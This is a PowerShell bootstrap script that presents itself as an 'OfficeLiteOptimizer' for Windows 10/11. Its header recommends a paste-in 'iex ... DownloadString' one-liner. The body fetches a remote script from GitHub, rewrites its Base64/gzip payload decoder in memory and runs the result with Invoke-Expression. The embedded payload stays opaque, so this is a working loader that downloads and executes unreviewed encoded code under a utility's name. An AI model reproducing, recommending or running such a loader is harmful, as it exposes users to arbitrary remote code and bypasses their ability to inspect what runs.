#requires -version 5.1
<#
OfficeLiteOptimizer.ps1
Stable bootstrap for Windows 10/11 and Windows PowerShell 5.1.

Recommended launcher for old Windows 10/11:
[Net.ServicePointManager]::SecurityProtocol = 3072; iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Abestreid/pc/main/OfficeLiteOptimizer.ps1'))
#>

$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = 3072

# Immutable v3.1.0 source. The original v3.1 payload was valid gzip data but its
# Base64 text was published without trailing padding. Patch only the decoder in
# memory, then execute the corrected script. Keeping this bootstrap small avoids
# corrupting a large embedded payload during future launcher edits.
$CoreUrl = 'https://raw.githubusercontent.com/Abestreid/pc/f73f48c2ef61d7536f198b67cb3b9f8ddec34ca9/OfficeLiteOptimizer.ps1'

try {
    $source = (New-Object Net.WebClient).DownloadString($CoreUrl)
}
catch {
    Write-Host 'ERROR: Cannot download OfficeLiteOptimizer core from GitHub.' -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Red
    throw
}

$needle = '$bytes = [Convert]::FromBase64String($payload)'
$replacement = @'
$payload = ($payload -replace '[^A-Za-z0-9+/=]', '')
$remainder = $payload.Length % 4
if ($remainder -eq 2) { $payload += '==' }
elseif ($remainder -eq 3) { $payload += '=' }
elseif ($remainder -eq 1) { throw 'Embedded payload is truncated or corrupted.' }
$bytes = [Convert]::FromBase64String($payload)
'@

if (-not $source.Contains($needle)) {
    throw 'OfficeLiteOptimizer bootstrap could not locate the v3.1 payload decoder.'
}

$source = $source.Replace($needle, $replacement)
Invoke-Expression $source
